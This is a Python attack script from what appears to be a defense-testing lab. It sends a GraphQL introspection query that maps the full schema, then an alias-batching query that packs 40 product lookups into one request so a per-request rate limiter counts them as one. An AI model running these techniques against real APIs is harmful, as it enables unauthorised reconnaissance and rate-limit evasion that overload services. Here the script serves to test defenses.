"""
Round 2 attack: GraphQL introspection scan and alias batching.

Step 1 (``introspection``): one introspection query returns the entire schema - every type, field and argument -
the GraphQL equivalent of downloading the API spec.

Step 2 (``alias_batch``): alias batching. One operation aliases the same ``product`` field many times
(``a0: product(id: 1) a1: product(id: 2) ...``), so one HTTP request drives dozens of resolver calls. A
per-request rate limiter counts this as one request; the backend does all the work.

At DEFENSE_LEVEL<2 both succeed (the REST limiter of Round 1 never looks at /graphql). At level 2 introspection
is rejected and the alias count exceeds the cap, so the batch is refused before it runs.

    python attacks/round2_graphql_batch.py [--only introspection|alias_batch]
"""

import argparse

from _common import SCRIPT_UA, ApiApp, bot_ip, finish

ACTOR = "bot:r2_graphql"
INTROSPECTION = "{ __schema { types { name kind fields { name } } } }"


def alias_batch(n):
    aliases = " ".join(f"a{i}: product(id: {i + 1}) {{ id sku price stock }}" for i in range(n))
    return "query Batch { " + aliases + " }"


def run(only=None, n=40):
    app = ApiApp(ACTOR, bot_ip(1), ua=SCRIPT_UA)
    out = {}
    if only in (None, "introspection"):
        r = app.gql(INTROSPECTION)
        types = (r.json().get("data") or {}).get("__schema", {}).get("types") if r.status_code == 200 else None
        out["types_mapped"] = len([t for t in types or [] if not t["name"].startswith("__")])
    if only in (None, "alias_batch"):
        r = app.gql(alias_batch(n), operation="Batch")
        body = r.json() if r.status_code == 200 else {}
        out["products_via_aliases"] = len(body.get("data") or {})
        out["resolver_cost"] = (body.get("extensions") or {}).get("cost", 0)
    got = out.get("types_mapped", 0) > 0, out.get("products_via_aliases", 0) == n
    wanted = {"introspection": got[0], "alias_batch": got[1]}
    if only:
        return finish(f"round2_{only}", 1, int(wanted[only]), "operations served", **out, verdict=app.client.verdict())
    return finish("round2_graphql_batch", 2, sum(got), "operations served", **out)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--only", choices=["introspection", "alias_batch"])
    run(ap.parse_args().only)
